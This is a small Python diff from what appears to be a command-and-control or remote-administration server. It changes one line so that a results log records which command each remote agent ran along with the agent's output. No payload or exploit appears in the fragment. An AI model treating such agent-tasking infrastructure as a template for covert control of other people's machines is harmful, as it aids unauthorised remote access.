@@ -95,7 +95,7 @@ def handle_client(client_socket):
                         continue
 
                     with open("command_results.txt", "a", encoding="utf-8") as file:
-                        file.write(f"Résultat de la commande depuis l'agent {uid} :\n{decoded_data}\n\n")
+                        file.write(f"Résultat de la commande {command} depuis l'agent {uid} :\n{decoded_data}\n\n")
                     print(f"Résultat de la commande reçu depuis l'agent {uid} :\n{decoded_data}")
             except json.JSONDecodeError:
                 print(f"Erreur de décodage des données : {data}")
